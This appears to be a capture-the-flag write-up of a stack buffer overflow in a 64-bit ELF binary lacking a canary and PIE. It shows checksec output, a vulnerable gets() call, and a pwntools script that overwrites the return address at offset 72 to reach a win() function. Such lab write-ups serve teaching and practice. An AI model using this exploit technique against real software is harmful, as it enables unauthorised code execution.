## Challenge

A basic 64-bit ELF binary with no PIE and no canary. The goal: pop a shell
via a classic stack buffer overflow.

```
$ checksec ./vuln
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE
```

## Recon

Loaded the binary in Ghidra to find the vulnerable function. `gets()` on a
64-byte stack buffer, called directly from `main`. Classic.

```c
void vuln(void) {
    char buf[64];
    gets(buf);
}
```

## Exploit

Offset to return address was 72 bytes. Built the payload with `pwntools`:

```python
from pwn import *

p = process('./vuln')
offset = 72
ret_addr = p64(0x401196)  # win()

payload = b'A' * offset + ret_addr
p.sendline(payload)
p.interactive()
```
